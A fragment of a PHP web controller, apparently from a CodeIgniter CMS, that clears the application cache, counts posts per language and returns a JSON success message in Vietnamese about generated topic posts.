            $files = glob(WRITEPATH . 'cache/*');
            if (!empty($files)) {
                foreach ($files as $file) {
                    if (is_file($file) && basename($file) !== 'index.html') {
                        @unlink($file);
                    }
                }
            }
            if (function_exists('resetCacheData')) {
                resetCacheData();
            }
        } catch (\Throwable $e) {}

        $languages = $db->table('languages')->get()->getResult();
        $postStats = $db->table('posts')->select('lang_id, count(*) as total')->groupBy('lang_id')->get()->getResult();

        return $this->response->setJSON([
            'status' => 'success',
            'message' => "Đã tạo thành công bài viết cho tất cả các chủ đề cốt lõi ({$insertedCount} bài mới, {$updatedCount} bài cập nhật)",
            'total_topics' => 5,
            'posts_per_topic' => 2,
            'languages' => $languages,
            'postStats' => $postStats,
            'activeLang_id' => $this->activeLang->id,
            'news_url' => langBaseUrl('posts')
        ]);
    }
}


